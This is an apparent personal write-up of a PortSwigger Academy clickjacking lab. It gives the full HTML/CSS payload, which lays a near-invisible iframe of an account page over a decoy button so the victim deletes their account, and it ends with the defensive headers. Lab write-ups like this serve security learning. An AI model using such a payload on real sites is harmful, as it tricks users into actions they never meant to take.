# PortSwigger Web Security Academy: Clickjacking Lab 1

## Lab Name
Basic clickjacking with CSRF token protection

## How I Solved 
1. **Authenticated:** Logged into the target account using the provided credentials to activate the user session.
2. **Crafted Payload:** Used the Exploit Server to host a malicious HTML page containing an `iframe` pointing to the target's `/my-account` page.
3. **UI Redressing (Alignment):** 
   * Added a fake `<div>Click me</div>` element.
   * Adjusted CSS (`top: 548px` and `left: 60px` absolute positioning) to align the fake button perfectly over the hidden target "Delete account" button.
4. **Made Transparent:** Changed the iframe `opacity` to `0.0001` to make the target site completely invisible to the victim.
5. Final Code Used
```html
<style> 
    iframe {
        position: relative;
        width: 900px;
        height: 700px;
        opacity: 0.0001; 
        z-index: 2;
    }
    div {
        position: absolute;
        top: 548px; 
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a96006f04ed0619807912190020002e.web-security-academy.net/my-account"></iframe>
```
6. **Executed Attack:** Delivered the exploit to the victim to trigger the account deletion.


## What I Learned

* **CSRF vs Clickjacking:** Anti-CSRF tokens do not protect against Clickjacking attacks.
* **The Reason:** Clickjacking tricks the actual user into interacting with the genuine UI. The browser automatically appends all valid session cookies and CSRF tokens with the request.
* **Defense:** To prevent Clickjacking, websites must enforce HTTP headers like `X-Frame-Options` or `Content-Security-Policy (CSP) frame-ancestors`.





